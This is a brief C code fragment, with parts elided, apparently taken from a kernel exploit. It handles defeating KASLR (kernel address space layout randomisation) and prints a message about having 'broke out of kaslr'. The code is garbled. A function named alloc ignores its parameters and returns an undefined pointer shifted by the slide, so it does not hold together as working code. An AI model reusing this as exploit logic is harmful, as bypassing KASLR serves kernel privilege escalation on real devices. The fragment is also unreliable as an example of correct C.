...
void* alloc(void* addr, uint32_t sz) {
...
#ifdef FIND_KERNEL_SLIDE
    if (!kaslr_slide_found) {
        /*
         Find the KASLR slide.
         */
        kaslr_slide = FIND_KERNEL_SLIDE;
        kaslr_slide_found = 1;
        printf("[i] broke out of kaslr, kaslr_slide = %016llx\n", kaslr_slide);
    }
    return (lsym_slidden_kern_pointer_t) pointer + kaslr_slide;
#endif
    return pointer;
}
